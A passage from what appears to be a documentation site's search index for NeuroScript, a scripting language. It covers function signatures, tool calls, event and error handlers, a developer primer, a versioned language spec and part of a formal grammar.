area\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#822-optional-parameters-optional","title":"8.2.2. Optional Parameters: <code>optional</code>","text":"<p>The <code>optional</code> clause lists parameters that are not required. If the caller does not provide a value for an optional parameter, it will default to <code>nil</code> inside the function.</p> <pre><code>func create_greeting(needs name optional title) means\n  if title != nil\n    return \"Hello, \" + title + \" \" + name\n  else\n    return \"Hello, \" + name\n  endif\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#823-return-values-returns","title":"8.2.3. Return Values: <code>returns</code>","text":"<p>The <code>returns</code> clause declares the names of the variables that the function will output. These names are used within the function body to assign the results that will be sent back to the caller.</p> <pre><code># This function returns two values, assigned to 'quotient' and 'remainder'.\nfunc divide(needs dividend, divisor returns quotient, remainder) means\n  set quotient = dividend / divisor\n  set remainder = dividend % divisor\n  return quotient, remainder\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#83-the-return-statement","title":"8.3. The <code>return</code> Statement","text":"<p>The <code>return</code> statement immediately exits the current function and passes values back to the caller. You can return zero or more values. If you return multiple values, they should correspond to the variables declared in the <code>returns</code> clause.</p> <p>Syntax: <code>return [&lt;expression1&gt;, &lt;expression2&gt;, ...]</code></p>"},{"location":"ns_full_guide/#84-callable_expr-how-functions-are-called","title":"8.4. <code>callable_expr</code>: How Functions are Called","text":"<p>A <code>callable_expr</code> (callable expression) is the grammar rule for anything that can be invoked with parentheses <code>()</code>. This includes user-defined functions, built-in functions, and external tools. The result of a callable expression can be assigned to a variable using <code>set</code> or executed for its side effects using <code>call</code>.</p> <pre><code># A callable expression whose result is assigned to a variable.\nset my_area = calculate_area(10, 5)\n\n# A callable expression executed for its side effects.\ncall tool.log.info(\"Calculation complete.\")\n</code></pre>"},{"location":"ns_full_guide/#85-built-in-functions","title":"8.5. Built-in Functions","text":"<p>NeuroScript provides a small set of built-in functions for common operations. These are invoked just like user-defined functions. The list includes:</p> <ul> <li><code>len()</code>: Returns the length of a string, list, or map.</li> <li><code>ln()</code>, <code>log()</code>: Mathematical logarithm functions.</li> <li><code>sin()</code>, <code>cos()</code>, <code>tan()</code>: Trigonometric functions.</li> <li><code>asin()</code>, <code>acos()</code>, <code>atan()</code>: Inverse trigonometric functions.</li> </ul>"},{"location":"ns_full_guide/#86-external-logic-the-tool-keyword","title":"8.6. External Logic: The <code>tool</code> Keyword","text":"<p>The <code>tool</code> keyword is the gateway to interacting with the host environment. It allows a script to call external functions, APIs, or any other capability registered with the NeuroScript interpreter.</p> <p>Note on Naming: The <code>tool</code> keyword is a special part of the language for accessing external functions and is not a variable. The dot notation that follows it is a required hierarchical naming convention, not a nested data access path on a variable.</p>"},{"location":"ns_full_guide/#861-tool-naming-convention-toolgroupname","title":"8.6.1. Tool Naming Convention: <code>tool.&lt;group&gt;.&lt;name&gt;</code>","text":"<p>Tools are organized into a two-level namespace to prevent collisions and improve clarity. Every tool call must follow this structure:</p> <p><code>tool.&lt;group&gt;.&lt;name&gt;(&lt;arguments&gt;)</code></p> <ul> <li><code>tool</code>: The required keyword.</li> <li><code>&lt;group&gt;</code>: A logical grouping for a set of related tools (e.g., <code>fs</code> for filesystem, <code>db</code> for database). Group names can themselves contain dots for further organization (e.g., <code>my.corp.utils</code>).</li> <li><code>&lt;name&gt;</code>: The specific name of the tool to be executed.</li> </ul> <pre><code># Call a tool in the 'fs' group named 'ReadFile'.\nset file_content = tool.fs.ReadFile(\"/path/to/my/file.txt\")\n\n# Call a tool to load another script into the environment.\ncall tool.script.LoadScript(\"::title: My Other Lib\\nfunc helper() means\\n emit 'ok'\\nendfunc\")\n</code></pre>"},{"location":"ns_full_guide/#9-event-and-error-handling_1","title":"9. Event and Error Handling","text":"<p>A robust script must be able to react to significant occurrences and gracefully manage unexpected problems. NeuroScript provides two distinct, powerful mechanisms for this: a declarative Event Model for responding to signals, and a structured Error Model for handling runtime failures.</p>"},{"location":"ns_full_guide/#91-the-event-model","title":"9.1. The Event Model","text":"<p>The event model allows scripts to react to signals, or \"events,\" that can be triggered by the host system, external tools, or even the script itself using the <code>emit</code> statement. This creates a loosely coupled way for different parts of a system to communicate. The event model is synchronous; when an <code>emit</code> statement is executed, all corresponding <code>on event</code> handlers are run to completion before the script continues.</p>"},{"location":"ns_full_guide/#911-on-event-do-endon","title":"9.1.1. <code>on event ... do ... endon</code>","text":"<p>The <code>on event</code> block is the core of event handling. It registers a block of code to be executed whenever a matching event occurs. These handlers can be defined at the top level of a library script.</p> <p>Syntax: <code>on event &lt;expression&gt; [named &lt;string&gt;] [as &lt;identifier&gt;] do</code> <code>... handler body ...</code> <code>endon</code></p> <ul> <li><code>&lt;expression&gt;</code>: An expression that identifies the event to listen for. This is often a string literal (e.g., <code>\"user.login\"</code>) or a tool call that resolves to an event name.</li> <li><code>named &lt;string&gt;</code>: (Optional) Assigns a unique name to the handler, allowing it to be specifically cleared later.</li> <li><code>as &lt;identifier&gt;</code>: (Optional) Captures the payload of the emitted event into a variable that can be used within the handler body.</li> </ul> <pre><code># A simple event handler\non event \"system.startup\" do\n  call tool.log.info(\"System has started.\")\nendon\n\n# A handler that captures the event's data payload\non event \"user.created\" as new_user do\n  emit \"A new user was created with ID: \" + new_user[\"id\"]\nendon\n</code></pre>"},{"location":"ns_full_guide/#912-emit-triggering-an-event","title":"9.1.2. <code>emit</code>: Triggering an Event","text":"<p>The <code>emit</code> statement, as seen previously, is used to fire an event. It takes an expression as its argument, which becomes the data payload of the event. Any <code>on event</code> handler registered for that event name will then be triggered.</p>"},{"location":"ns_full_guide/#913-clear-event-removing-listeners","title":"9.1.3. <code>clear event</code>: Removing Listeners","text":"<p>You can unregister an event handler using the <code>clear event</code> statement. This is useful for dynamically managing which events your script should respond to. You can clear by the event name or by the specific name you gave the handler.</p> <pre><code># Clear all handlers for the \"system.startup\" event\nclear event \"system.startup\"\n\n# Clear a specific handler by its assigned name\non event \"user.login\" named \"MyLoginHandler\" do\n  # ...\nendon\n\nclear event named \"MyLoginHandler\"\n</code></pre>"},{"location":"ns_full_guide/#92-the-error-model","title":"9.2. The Error Model","text":"<p>The error model provides a structured way to handle runtime failures, such as a tool failing or a <code>must</code> statement evaluating to false.</p>"},{"location":"ns_full_guide/#921-on-error-do-endon","title":"9.2.1. <code>on error ... do ... endon</code>","text":"<p>The <code>on error</code> block defines a set of statements to execute when a failure occurs within its scope. This block can be defined inside any <code>func</code> or <code>command</code> block.</p> <p>Syntax: <code>on error do</code> <code>... error handler body ...</code> <code>endon</code></p> <p>When an error occurs, the interpreter immediately stops normal execution and jumps to the nearest enclosing <code>on error</code> block.</p>"},{"location":"ns_full_guide/#922-fail-triggering-an-error","title":"9.2.2. <code>fail</code>: Triggering an Error","text":"<p>The <code>fail</code> statement explicitly triggers an error, immediately halting the current flow and activating the error handling mechanism.</p>"},{"location":"ns_full_guide/#923-clear_error-resetting-the-error-state","title":"9.2.3. <code>clear_error</code>: Resetting the Error State","text":"<p>Inside an <code>on error</code> block, you have two choices: 1.  Let the script terminate: If you do nothing, the script will exit after the <code>on error</code> block finishes. 2.  Handle the error and continue: If you want the script to recover and continue execution from the statement following the handler, you must call <code>clear_error</code>. This statement resets the interpreter's error state.</p>"},{"location":"ns_full_guide/#func-process_fileneeds-file_path-means-on-error-do-emit-failed-to-process-file-file_path-we-dont-clear-the-error-so-the-function-will-exit-after-this-endon-set-content-toolfsreadfile_path-this-tool-might-fail-emit-file-read-successfully-more-processing-endfunc-func-resilient_task-means-on-error-do-emit-a-recoverable-error-occurred-continuing-clear_error-the-error-is-handled-the-script-will-not-terminate-endon-fail-this-is-a-test-failure-emit-this-line-will-be-executed-because-the-error-was-cleared-endfunc","title":"<pre><code>func process_file(needs file_path) means\n  on error do\n    emit \"Failed to process file: \" + file_path\n    # We don't clear the error, so the function will exit after this.\n  endon\n\n  set content = tool.fs.read(file_path) # This tool might fail\n  emit \"File read successfully.\"\n  # ... more processing ...\nendfunc\n\nfunc resilient_task() means\n  on error do\n    emit \"A recoverable error occurred. Continuing.\"\n    clear_error  # The error is handled; the script will not terminate.\n  endon\n\n  fail \"This is a test failure.\"\n\n  emit \"This line will be executed because the error was cleared.\"\nendfunc\n</code></pre>","text":""},{"location":"ns_full_guide/#10-advanced-operators-and-reserved-keywords_1","title":"10. Advanced Operators and Reserved Keywords","text":"<p>Beyond the fundamental statements and expressions, NeuroScript includes a few specialized operators for introspection and convenience, as well as keywords that are reserved for future language features. This section covers these more nuanced parts of the language.</p>"},{"location":"ns_full_guide/#101-type-introspection-with-typeof","title":"10.1. Type Introspection with <code>typeof</code>","text":"<p>The <code>typeof</code> operator is a unary operator that returns the data type of its operand as a string. This is useful for performing checks and validations at runtime, allowing your script to handle different types of data dynamically.</p> <p>Syntax: <code>typeof &lt;expression&gt;</code></p> <p>The strings returned by <code>typeof</code> include: <code>\"string\"</code>, <code>\"number\"</code>, <code>\"boolean\"</code>, <code>\"list\"</code>, <code>\"map\"</code>, <code>\"nil\"</code>, <code>\"function\"</code>, <code>\"tool\"</code>, and more.</p> <pre><code>func process_value(needs val) means\n  set value_type = typeof val\n\n  if value_type == \"string\"\n    emit \"The value is a string with length: \" + len(val)\n  else\n    if value_type == \"list\"\n      emit \"The value is a list with \" + len(val) + \" items.\"\n    else\n      emit \"The value is of an unhandled type: \" + value_type\n    endif\n  endif\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#102-the-some-and-no-operators","title":"10.2. The <code>some</code> and <code>no</code> Operators","text":"<p>The <code>some</code> and <code>no</code> operators provide a highly readable, \"syntactic sugar\" way to check if a list is empty or <code>nil</code>.</p> <ul> <li><code>some</code>: Returns <code>true</code> if the list exists and contains at least one element. It is equivalent to <code>(my_list != nil and len(my_list) &gt; 0)</code>.</li> <li><code>no</code>: Returns <code>true</code> if the list is <code>nil</code> or has a length of zero. It is the direct opposite of <code>some</code>.</li> </ul> <p>Syntax: <code>some &lt;expression&gt;</code> or <code>no &lt;expression&gt;</code></p> <pre><code>func check_list(needs items) means\n  if some items\n    emit \"The list contains items.\"\n    # Proceed to iterate or process the list\n    for each i in items\n      # ...\n    endfor\n  endif\n\n  if no items\n    emit \"The list is empty or nil.\"\n  endif\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#103-reserved-keywords-for-future-use","title":"10.3. Reserved Keywords for Future Use","text":"<p>Some words are reserved as keywords in the NeuroScript grammar to ensure they are available for planned future features. While they will be parsed correctly, they currently have no implemented functionality in the interpreter.</p>"},{"location":"ns_full_guide/#1031-type-assertion-mustbe","title":"10.3.1. Type Assertion: <code>mustbe</code>","text":"<p>The <code>mustbe</code> keyword is reserved for a future type assertion system. The intended functionality is to provide a way to enforce that a variable is of a certain type, similar to how <code>must</code> enforces a boolean condition. This keyword is defined in the grammar but is not used in any parser rules.</p> <p>Metadata</p> <p>::schema: spec ::serialization: md ::langVersion: neuroscript@0.4.6 ::fileVersion: 2 ::description: A comprehensive guide to the NeuroScript language, covering syntax, data types, control flow, and advanced features. ::author: Gemini and Andrew Price ::created: 2025-07-13 ::modified: 2025-07-26 ::license: Proprietary ::tags: neuroscript,guide,documentation,spec,language ::type: documentation ::subtype: language_guide ::dependsOn: NeuroScript.g4.txt ::howToUpdate: Update sections to match new interpreter features or grammar changes. Increment fileVersion.</p>"},{"location":"ns_primer/","title":"Ns primer","text":""},{"location":"ns_primer/#neuroscript-developer-primer-v04","title":"NeuroScript - Developer Primer (v0.4)","text":"<p>Tag-line: Procedural scaffolding for humans, AIs and plain Go code.</p>"},{"location":"ns_primer/#1-why-bother","title":"1. Why bother?","text":"<ul> <li> <p>Readable steps, no hidden \u201cprompt soup\u201d.   Code is the chain-of-thought.</p> </li> <li> <p>Single source of truth.   A <code>.ns</code> file is documentation, executable logic, and metadata for search/RAG.</p> </li> <li> <p>Interop with Go.   Tools map 1-to-1 onto Go functions; the interpreter is a thin wrapper layer.</p> </li> </ul>"},{"location":"ns_primer/#2-file-skeleton","title":"2. File skeleton","text":"<pre><code>:: lang_version: neuroscript@0.4.0\n:: file_version: 1\n\nfunc DoThing(needs x, y optional opts returns out1, out2) means\n  :: description: Adds then multiplies.         # metadata\n  set sum = x + y                               # statement\n  set prod = sum * (opts[\"factor\"] or 1)\n  return sum, prod\nendfunc\n</code></pre> <ul> <li>Metadata (<code>:: key: value</code>) always first \u2013 parsed, indexed, searchable.</li> <li><code>func \u2026 endfunc</code> \u2013 one procedure = one reusable \u201cskill\u201d.</li> <li>Signature clauses: <code>needs</code>, <code>optional</code>, <code>returns</code>; parentheses optional.</li> </ul>"},{"location":"ns_primer/#3-types-at-a-glance","title":"3. Types at a glance","text":"Kind Literal / creator Notes <code>string</code> <code>\"hi\"</code> or <code></code>raw<code></code> Triple-backtick raw strings allow <code>{{placeholders}}</code>. <code>number</code> <code>1</code>, <code>3.14</code> <code>int64</code> or <code>float64</code> under the hood. <code>bool</code> <code>true</code>, <code>false</code> <code>list</code> <code>[1, 2, 3]</code> Any element types. <code>map</code> <code>{\"k\": 1}</code> Keys must be string literals. <code>nil</code> <code>nil</code> Absence of value. New v0.4 <code>error</code> Returned by tools: <code>{\"code\":\"ENOENT\",\"message\":\"\u2026\"}</code> <code>timedate</code> <code>tool.Time.Now()</code> Wraps <code>time.Time</code>. <code>event</code> System events, emitted by runtime. <code>fuzzy</code> Tool-created real \u2208 [0,1] Fuzzy logic operators <code>and</code>/<code>or</code>/<code>not</code>. <p><code>typeof(expr)</code> \u2192 string constants (<code>\"string\"</code>, <code>\"list\"</code>, \u2026) for quick checks.</p>"},{"location":"ns_primer/#4-multiple-return-values","title":"4. Multiple return values","text":"<ul> <li>Always positional (<code>return a, b</code>) \u2192 caller receives list <code>[a, b]</code>.</li> <li>Recommended pattern: immediately destructure:</li> </ul> <pre><code>set sum, product = MyMath(needs x, y)\n</code></pre>"},{"location":"ns_primer/#5-error-handling-fail-fast-fail-loud","title":"5. Error handling \u2013 fail fast, fail loud","text":"Tool returns You write Result Normal value <code>set data = must tool.FS.Read(path)</code> <code>data</code> assigned. <code>error</code> map <code>must</code> triggers runtime error \u2192 jumps to nearest <code>on error</code>. Unexpected panic Propagates straight to <code>on error</code>. <p>Idioms</p> <pre><code>on error means                # try/catch\n  emit \"fatal: \" + system.error_message\n  return \"Failed\"\nendon\n\nset cfg  = must tool.JSON.Parse(text)         # parse or die\nset port = must cfg[\"port\"] as int            # key + type assertion\n</code></pre> <ul> <li><code>must expr</code> \u2013 boolean assertion.</li> <li><code>set v = must expr</code> \u2013 mandatory success check (error-map aware).</li> <li><code>fail \"msg\"</code> \u2013 deliberate abort.</li> <li><code>clear_error</code> \u2013 swallow inside an <code>on error</code> block.</li> </ul>"},{"location":"ns_primer/#6-control-flow-statements","title":"6. Control flow &amp; statements","text":"<ul> <li><code>if / else / endif</code></li> <li><code>while / endwhile</code></li> <li><code>for each item in list / endfor</code></li> <li><code>break</code>, <code>continue</code></li> <li><code>return</code>, <code>emit</code>, <code>call</code> (side-effect invoke)</li> </ul>"},{"location":"ns_primer/#7-tools-built-ins","title":"7. Tools &amp; built-ins","text":"<ul> <li> <p>Tools: namespaced Go functions (<code>tool.FS.Read</code>, <code>tool.JSON.Parse</code>).   Adapters unwrap/rewrap values; your Go code sees primitives.</p> </li> <li> <p>Built-ins: maths &amp; helpers (<code>ln</code>, <code>sin</code>, <code>typeof</code>).   Identical calling convention to tools.</p> </li> </ul> <p>Tool names must be complete: tool.. where group is \"FS\", \"io\" etc. and action is the action the tool performs, e.g. \"read\", \"write\". Hence: tool.fs.read Tool names are case-insensitive"},{"location":"ns_primer/#8-ai-integration-ask","title":"8. AI integration (<code>ask</code>)","text":"<pre><code>set prompt = eval(\"Summarise {{topic}} in 3 bullets.\")\nask prompt into summary\n</code></pre> <ul> <li>Routes to configured LLM.</li> <li>Response stored in var and <code>last</code>.</li> </ul>"},{"location":"ns_primer/#9-convenience-features","title":"9. Convenience features","text":"<ul> <li><code>last</code> \u2013 value from most recent successful call.</li> <li>Placeholders \u2013 <code>{{var}}</code> auto-resolved in raw strings, or via <code>eval()</code> in normal strings.</li> <li>Line continuation \u2013 trailing <code>\\</code> to wrap long expressions.</li> </ul>"},{"location":"ns_primer/#10-mental-model","title":"10. Mental model","text":"<pre><code>Interpreter (core.Value wrappers)\n        \u2502\n        \u25bc\n   Adapter layer\n        \u2502\n   \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 Built-in fns     \u2502  (primitives)\n   \u2502 Tool validators  \u2502\n   \u2502 Tool impls       \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>One choke-point = one place to debug.</p>"},{"location":"ns_primer/#next-steps","title":"Next steps","text":"<ul> <li>Browse the illustrative examples in <code>prompts.go</code>.</li> <li>Read <code>ns_script_spec.md</code> for deeper semantics.</li> <li>Implement your own tool in Go: write a plain function, register, done.</li> </ul> <p>\u201cWrite procedures like you\u2019d write comments\u2014then run them.\u201d</p>"},{"location":"ns_script_spec/","title":"NeuroScript \u2014 Language Specification (v0.4.4)","text":"<p>Status: DRAFT \u2013 reflects grammar file <code>NeuroScript.g4 v0.4.2</code> Last-updated: 2025-06-24</p>"},{"location":"ns_script_spec/#0-compatibility-guide","title":"0 \u00b7 Compatibility guide","text":"Version Breaking? What changed 0.4.4 no Documentation only: Added section on line continuation. 0.4.3 no Documentation only: Added sections on scope, assignment, built-ins, and data access. 0.4.2 no Event handlers, <code>as</code> support in both <code>on event</code> and <code>on error</code>, <code>clear_event</code>, <code>rep&gt;=</code> filter, <code>len()</code> built-in, new native types <code>bytes</code> and <code>error</code>. 0.4.1 no <code>must</code> enhancements (mandatory assignment, map-key/type assertions). 0.4.0 yes First public cut, metadata header required."},{"location":"ns_script_spec/#1-design-goals","title":"1 \u00b7 Design goals","text":"<ul> <li>Executable documentation \u2013 readable by humans &amp; AIs.</li> <li>First-class skill objects \u2013 every <code>func</code> is storable, searchable, callable.</li> <li>Strong defensive runtime \u2013 <code>must \u2026</code> and <code>on error</code> promote \u201cfail-fast\u201d.</li> <li>Extensible \u2013 new blocks/keywords only ever add to the grammar (no breaking rewrites).</li> </ul>"},{"location":"ns_script_spec/#2-file-layout","title":"2 \u00b7 File layout","text":"<ol> <li>Metadata header (<code>:: key: value</code>) \u2013 mandatory, must come first.</li> <li>Zero \u207a procedures (<code>func \u2026 endfunc</code>).</li> <li>Blank lines and comments (<code>#</code>, <code>--</code>, <code>//</code>) may appear anywhere.</li> </ol>"},{"location":"ns_script_spec/#3-procedure-syntax-recap","title":"3 \u00b7 Procedure syntax (recap)","text":"<pre><code>func Name (needs a, b  optional cfg  returns out) means\n  :: description: \u2026\n  # body\nendfunc\n</code></pre>"},{"location":"ns_script_spec/#4-variable-scope-assignment-execution","title":"4 \u00b7 Variable Scope, Assignment &amp; Execution","text":""},{"location":"ns_script_spec/#41-scope","title":"4.1 Scope","text":"<p>Variables have function-level scope. A variable declared with <code>set</code> is visible anywhere within its containing <code>func</code> block after the point of declaration.</p>"},{"location":"ns_script_spec/#42-assignment-set","title":"4.2 Assignment (<code>set</code>)","text":"<p>Use the <code>set</code> keyword to declare a variable and assign it a value.</p> <pre><code>set name = \"Zadeh\"\nset parts = tool.Split(\"a,b,c\", \",\")\n</code></pre>"},{"location":"ns_script_spec/#43-execution-call","title":"4.3 Execution (<code>call</code>)","text":"<p>Use the <code>call</code> keyword to execute a tool function for its side-effects when you do not need its return value.</p> <p><pre><code>call tool.io.Print(\"Process complete.\")\n</code></pre> Tool names must be complete: tool.. where group is \"FS\", \"io\" etc. and action is the action the tool performs, e.g. \"read\", \"write\". Hence: tool.fs.read Tool names are case-insensitive"},{"location":"ns_script_spec/#44-line-continuation","title":"4.4 Line Continuation","text":"<p>A single statement can be split across multiple physical lines by placing a backslash (<code>\\</code>) at the very end of a line. This is most common when defining large map or list literals.</p> <pre><code>call tool.FDM.CreateNode(\"text/v1\", { \\\n  \"body\": \"some long text...\", \\\n  \"author\": \"system\" \\\n})\n</code></pre>"},{"location":"ns_script_spec/#5-control-blocks","title":"5 \u00b7 Control blocks","text":""},{"location":"ns_script_spec/#51-event-handler","title":"5.1 Event handler","text":"<pre><code>on event user.registered  named \"welcome-mail\"  as ev do\n  call tool.Mail.Send(ev.email, \"Welcome!\", \"Thanks for joining\")\nendon\n</code></pre>"},{"location":"ns_script_spec/#52-error-handler-as-err","title":"5.2 Error handler (+ <code>as err</code>)","text":"<pre><code>on error as err do\n  emit \"fatal: \" + err.message\n  clear_error\nendon\n</code></pre>"},{"location":"ns_script_spec/#53-clear-event-subscription","title":"5.3 Clear event subscription","text":"<pre><code>clear_event \"welcome-mail\"\n</code></pre>"},{"location":"ns_script_spec/#6-statement-expression-additions","title":"6 \u00b7 Statement / expression additions","text":"Feature Added Notes <code>clear_event</code> 0.4.2 See \u00a75.3 <code>must \u2026</code> 0.4.1 Boolean assert, mandatory assign, key/type checks <code>mustbe f(x)</code> 0.4.1 Convenience for custom validators ACL filter <code>rep&gt;=N</code> 0.4.2 Runtime filter, not script syntax"},{"location":"ns_script_spec/#7-built-in-functions","title":"7 \u00b7 Built-in Functions","text":"<ul> <li><code>len(expr)</code></li> <li><code>typeof(expr)</code></li> </ul>"},{"location":"ns_script_spec/#8-native-types-complete-list","title":"8 \u00b7 Native types (complete list)","text":"Type Literals / creators string <code>\"text\"</code> int / float <code>42</code>, <code>3.14</code> bool <code>true</code>, <code>false</code> nil <code>nil</code> list <code>[1, 2]</code> map <code>{\"k\": v}</code> timedate <code>tool.Time.Now()</code> bytes <code>b\"48656c6c6f\"</code> event delivered to <code>on event</code> blocks error bound by <code>on error as err</code> fuzzy <code>tool.Fuzzy.Make(0.7)</code>"},{"location":"ns_script_spec/#81-accessing-collection-data","title":"8.1 Accessing Collection Data","text":"<ul> <li>Maps: <code>my_map[\"key\"]</code></li> <li>Lists: <code>my_list[0]</code></li> </ul>"},{"location":"ns_script_spec/#9-error-handling-model","title":"9 \u00b7 Error handling model","text":"<ul> <li>Operational errors \u2192 tools return <code>error</code> objects; use <code>must</code> to abort fast.</li> <li>Runtime panics (failed <code>must</code>, index OOB) trigger nearest <code>on error</code>.</li> <li><code>clear_error</code> swallows a panic within an <code>on error</code> block.</li> <li><code>fail \"msg\"</code> raises a panic directly.</li> </ul>"},{"location":"ns_script_spec/#10-event-loop-semantics","title":"10 \u00b7 Event-loop semantics","text":"<ol> <li>Execute next statement.</li> <li>Dispatch one ready event/error handler.</li> <li>Repeat.</li> </ol>"},{"location":"ns_script_spec/#11-reserved-keywords-v042","title":"11 \u00b7 Reserved keywords (v0.4.2)","text":"<pre><code>acos and as asin ask atan break bytes call clear clear_error\ncontinue cos do each else emit endfor endfunc endif endon endwhile\nerror eval event fail false for func fuzzy if in into last len ln log\nmeans must mustbe named needs nil no not on optional or rep return\nreturns set sin some tan timedate tool true typeof while\n</code></pre>"},{"location":"ns_script_spec/#12-formal-grammar-reference","title":"12 \u00b7 Formal grammar reference","text":"<p>See <code>ns_script_spec_formal.md</code> \u2013 generated automatically from <code>NeuroScript.g4</code>.</p>"},{"location":"ns_script_spec/#13-change-history","title":"13 \u00b7 Change history","text":"<ul> <li>2025-06-24 \u2013 v0.4.4 \u2014 Docs-only update: Added section on line continuation (<code>\\</code>).</li> <li>2025-06-24 \u2013 v0.4.3 \u2014 Docs-only update: Added sections on scope, assignment vs. execution, built-in functions, and collection data access.</li> <li>2025-06-23 \u2013 v0.4.2 \u2014 event handlers, <code>on error as</code>, <code>clear_event</code>, <code>bytes</code>, <code>len()</code>, ACL <code>rep&gt;=</code>.</li> <li>2025-06-17 \u2013 v0.4.1 \u2014 <code>must</code> improvements.</li> <li>2025-06-16 \u2013 v0.4.0 \u2014 first public cut.</li> </ul>"},{"location":"ns_script_spec_formal/","title":"Ns script spec formal","text":"<p># NeuroScript \u2014 Formal Language Specification (v0.4.3)</p> <p>Status: DRAFT Source: Derived directly from the <code>NeuroScript.g4</code> (v0.4.2) grammar file. Note: This document defines the formal structure of NeuroScript using a human-readable EBNF notation that mirrors the official ANTLR grammar.</p> <p>## 1 \u00b7 Notation</p> <p>This document uses a simplified EBNF-like notation:</p> <ul> <li><code>::=</code>  means \"is defined as\".</li> <li><code>|</code>    means \"OR\".</li> <li><code>{...}</code> means \"zero or more\" repetitions (ANTLR <code>*</code>).</li> <li><code>[...]</code> means \"optional\" (zero or one) (ANTLR <code>?</code>).</li> <li><code>&lt;NonTerminal&gt;</code> refers to another rule (lowercase_with_underscores).</li> <li><code>'TOKEN'</code> refers to a literal keyword or symbol (UPPERCASE).</li> <li><code>\u03b5</code> represents an empty production.</li> </ul> <p>## 2 \u00b7 Script Structure</p> <p>A NeuroScript file consists of a header containing metadata, followed by a series of code blocks.</p> <pre><code>&lt;program&gt; ::= &lt;file_header&gt; { &lt;code_block&gt; } 'EOF'\n\n&lt;file_header&gt; ::= { 'METADATA_LINE' | 'NEWLINE' } \n\n&lt;code_block&gt; ::= ( &lt;procedure_definition&gt; | &lt;on_statement&gt; ) { 'NEWLINE' } \n</code></pre> <p>## 3 \u00b7 Procedures</p> <p>A procedure is a named, callable block of code defined with <code>'func'</code>.</p> <pre><code>&lt;procedure_definition&gt; ::= 'KW_FUNC' 'IDENTIFIER' &lt;signature_part&gt; 'KW_MEANS' 'NEWLINE' &lt;metadata_block&gt; &lt;statement_list&gt; 'KW_ENDFUNC' \n\n&lt;signature_part&gt; ::= 'LPAREN' { &lt;needs_clause&gt; | &lt;optional_clause&gt; | &lt;returns_clause&gt; } 'RPAREN'\n                   | ( &lt;needs_clause&gt; | &lt;optional_clause&gt; | &lt;returns_clause&gt; )+\n                   | \u03b5 \n\n&lt;needs_clause&gt; ::= 'KW_NEEDS' &lt;param_list&gt; \n&lt;optional_clause&gt; ::= 'KW_OPTIONAL' &lt;param_list&gt; \n&lt;returns_clause&gt; ::= 'KW_RETURNS' &lt;param_list&gt; \n\n&lt;param_list&gt; ::= 'IDENTIFIER' { 'COMMA' 'IDENTIFIER' } \n\n&lt;metadata_block&gt; ::= { 'METADATA_LINE' 'NEWLINE' } \n</code></pre> <p>## 4 \u00b7 Statements</p> <p>A statement list is a sequence of statements, each on its own line.</p> <pre><code>&lt;statement_list&gt; ::= { &lt;body_line&gt; } \n\n&lt;body_line&gt; ::= &lt;statement&gt; 'NEWLINE' | 'NEWLINE' \n\n&lt;statement&gt; ::= &lt;simple_statement&gt; | &lt;block_statement&gt; | &lt;on_statement&gt; \n</code></pre> <p>### 4.1 Simple Statements  Simple statements are single-line executable constructs.</p> <pre><code>&lt;simple_statement&gt; ::= &lt;set_statement&gt; | &lt;call_statement&gt; | &lt;return_statement&gt; \n                     | &lt;emit_statement&gt; | &lt;must_statement&gt; | &lt;fail_statement&gt; \n                     | &lt;clear_error_statement&gt; | &lt;clear_event_statement&gt; | &lt;ask_statement&gt; \n                     | &lt;break_statement&gt; | &lt;continue_statement&gt; \n\n&lt;lvalue&gt; ::= 'IDENTIFIER' { 'LBRACK' &lt;expression&gt; 'RBRACK' | 'DOT' 'IDENTIFIER' } \n&lt;lvalue_list&gt; ::= &lt;lvalue&gt; { 'COMMA' &lt;lvalue&gt; } \n\n&lt;set_statement&gt; ::= 'KW_SET' &lt;lvalue_list&gt; 'ASSIGN' &lt;expression&gt; \n&lt;call_statement&gt; ::= 'KW_CALL' &lt;callable_expr&gt; \n&lt;return_statement&gt; ::= 'KW_RETURN' [ &lt;expression_list&gt; ] \n&lt;emit_statement&gt; ::= 'KW_EMIT' &lt;expression&gt; \n&lt;must_statement&gt; ::= 'KW_MUST' &lt;expression&gt; | 'KW_MUSTBE' &lt;callable_expr&gt; \n&lt;fail_statement&gt; ::= 'KW_FAIL' [ &lt;expression&gt; ] \n&lt;clear_error_statement&gt; ::= 'KW_CLEAR_ERROR' \n&lt;clear_event_statement&gt; ::= 'KW_CLEAR' 'KW_EVENT' ( &lt;expression&gt; | 'KW_NAMED' 'STRING_LIT' ) \n&lt;ask_statement&gt; ::= 'KW_ASK' &lt;expression&gt; [ 'KW_INTO' 'IDENTIFIER' ] \n&lt;break_statement&gt; ::= 'KW_BREAK' \n&lt;continue_statement&gt; ::= 'KW_CONTINUE' \n</code></pre> <p>### 4.2 Block Statements  Block statements contain a nested list of statements.</p> <pre><code>&lt;block_statement&gt; ::= &lt;if_statement&gt; | &lt;while_statement&gt; | &lt;for_each_statement&gt; \n\n&lt;if_statement&gt; ::= 'KW_IF' &lt;expression&gt; 'NEWLINE' &lt;statement_list&gt;\n                   [ 'KW_ELSE' 'NEWLINE' &lt;statement_list&gt; ]\n                   'KW_ENDIF' \n\n&lt;while_statement&gt; ::= 'KW_WHILE' &lt;expression&gt; 'NEWLINE' &lt;statement_list&gt; 'KW_ENDWHILE' \n\n&lt;for_each_statement&gt; ::= 'KW_FOR' 'KW_EACH' 'IDENTIFIER' 'KW_IN' &lt;expression&gt; 'NEWLINE' &lt;statement_list&gt; 'KW_ENDFOR' \n</code></pre> <p>### 4.3 On Statements (Handlers)  Handlers for events and errors are defined with <code>on</code>.</p> <pre><code>&lt;on_statement&gt; ::= 'KW_ON' ( &lt;error_handler&gt; | &lt;event_handler&gt; ) \n\n&lt;error_handler&gt; ::= 'KW_ERROR' 'KW_DO' 'NEWLINE' &lt;statement_list&gt; 'KW_ENDON' \n\n&lt;event_handler&gt; ::= 'KW_EVENT' &lt;expression&gt; [ 'KW_NAMED' 'STRING_LIT' ] [ 'KW_AS' 'IDENTIFIER' ] 'KW_DO' 'NEWLINE' &lt;statement_list&gt; 'KW_ENDON' \n</code></pre> <p>## 